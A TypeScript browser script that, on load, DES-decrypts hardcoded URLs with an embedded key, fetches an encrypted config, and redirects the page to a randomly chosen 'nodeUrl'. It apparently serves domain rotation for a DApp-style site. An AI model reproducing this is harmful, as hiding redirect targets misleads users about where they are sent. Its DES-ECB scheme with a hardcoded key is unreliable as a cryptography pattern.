// import axios from "../node_modules/axios/index";

import axios from '../node_modules/axios/index';
import * as CryptoJS from 'crypto-js';
/**
 * DES加密
 * @param message
 * @param key
 * @returns
 */
function encryptByDES(message: string, key: string) {
    var keyHex = CryptoJS.enc.Utf8.parse(key);
    var encrypted = CryptoJS.DES.encrypt(message, keyHex, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7,
    });

    return encrypted.ciphertext.toString();
}
/**
 * DES解密
 * @param text
 * @param key
 * @returns
 */
function decryptByDES(text: string, key: string) {
    //DES解密
    var keyHex = CryptoJS.enc.Utf8.parse(key);
    let decrypted = CryptoJS.DES.decrypt({ ciphertext: CryptoJS.enc.Hex.parse(text) } as any, keyHex, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7,
    });

    return decrypted.toString(CryptoJS.enc.Utf8);
}
const getConfigFile = async (url: string) => {
    try {
        console.log('get url', url);
        let req = await axiosInstance.request({ headers: {}, url: url, method: 'get' });
        console.log('request:', req.data);
        req.data.text =
            '3A7A3A92ECBF17ED615A316D66ACD6A1B7F17645F00658C836AF746950DB2B01A4855B034E373DFB3B4F408E0D14E0BCE56AF539FF0CFAF6B0285D36DD44405AAE3D91AE89E2FF16AFA626D7F62E159C051204BB47AB8840B201391F4239023F2CA09A2F99FCE898E5A809766F600222C258338210CE2E73B98039158AAAF2125207CA5099E5201441EA23993D08B0C4E83D6FB1A2B2DD55EAFC4AEC16AB2EF04BBD04442F4ADC5623CF3D71571BFD8BAB9555A1E1E341FD40470C212DE99310B23CE24A0DADD430C4A2F6A6EEDE1B08830AAC8390542A30052391A054D46DCB527A41256964F72B28A8650957BD144140E07ADBCF87CA0DC498A3A799E6C369FFC3A843AAB9B3BDA0FAB7D94C65A0F3F136D1BA62D9334B19B73D40EE2D9258C54C80B19F3763AF727F3EAF7A32B92A96893F4100D65AE70B914B4C772B63AB3F4E0D311D1C917336A315196D1FDAEC0EE137A73097B42F64DABE75AD2E46E86B10213A2A7E6B40295CF5BDEB4CAC9DFECC5C4A04B8ECAC65E37748D1207C34';
        if (req && req.data && req.data.text) {
            let decryptStr = decryptByDES(req.data.text, 'DAPPDAPP');
            console.log('encryptByDES:', decryptStr);
            return { config: JSON.parse(decryptStr) };
        }
    } catch (error) {
        return { error: error };
    }
};
const randomInteger = function (min: number, max: number): number {
    var choices = max - min + 1;
    return Math.floor(Math.random() * choices + min);
};

const getURL = async (urlList: Array<string>) => {
    for (let url of urlList) {
        let realUrl = decryptByDES(url, 'DAPPDAPP');
        let ret = await getConfigFile(realUrl);
        console.log('getConfigFile:', ret);
        if (ret && ret.config) {
            console.log('config ok:', ret.config);
            let nodeUrl = ret.config.nodeUrl || [];
            if (nodeUrl.length == 0) continue;
            let ref: string = nodeUrl[randomInteger(0, nodeUrl.length - 1)];
            window.location.href = ref;
            break;
        }
    }
};
const axiosInstance = axios.create();

getURL([
    'C54C80B19F3763AF727F3EAF7A32B92A96893F4100D65AE771EEF86FD68149A92ADE3B7A8DCF99FDE29DC77DA191F05F',
    'C54C80B19F3763AF727F3EAF7A32B92A96893F4100D65AE771EEF86FD68149A92ADE3B7A8DCF99FDFCB33A11F3270DB8',
]);

